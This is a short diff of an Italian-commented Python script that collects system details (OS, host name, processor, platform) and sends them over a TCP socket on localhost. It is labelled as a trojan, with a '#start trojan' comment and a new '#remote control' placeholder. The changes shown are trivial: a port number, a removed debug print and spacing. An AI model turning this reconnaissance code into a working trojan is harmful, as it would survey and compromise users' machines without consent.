@@ -7,7 +7,7 @@ import cpuinfo
 import signal
 
 IP="localhost"
-PORT = 12001 #Porta di Ascolto del TCP
+PORT = 9090 #Porta di Ascolto del TCP
 ADDR = (IP, PORT)
 SIZE = 4096
 FORMAT = "utf-8"
@@ -46,12 +46,11 @@ def sendInfo(client):
     while mando == 1:
         try:
             infos = "OS: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release()
-            print(str((len(infos))))
             client.send((str((len(infos)))).encode(FORMAT))
             client.send(((infos)).encode(FORMAT))
             mando = 0
         except:
-            client.send(("[ERROR] Dati non mandati correttamente, riprovare? Y/N").encode(FORMAT))
+            client.send(("[ERROR] Dati non mandati correttamente, riprovare? Y/N ").encode(FORMAT))
             risposta = client.recv(1024).decode(FORMAT)
             if risposta == "Y" or risposta == "y":
                 mando = 1
@@ -79,6 +78,8 @@ def main():
 
         sendInfo(client)
         client.close()
+
+        #remote control
 
 
     #start trojan
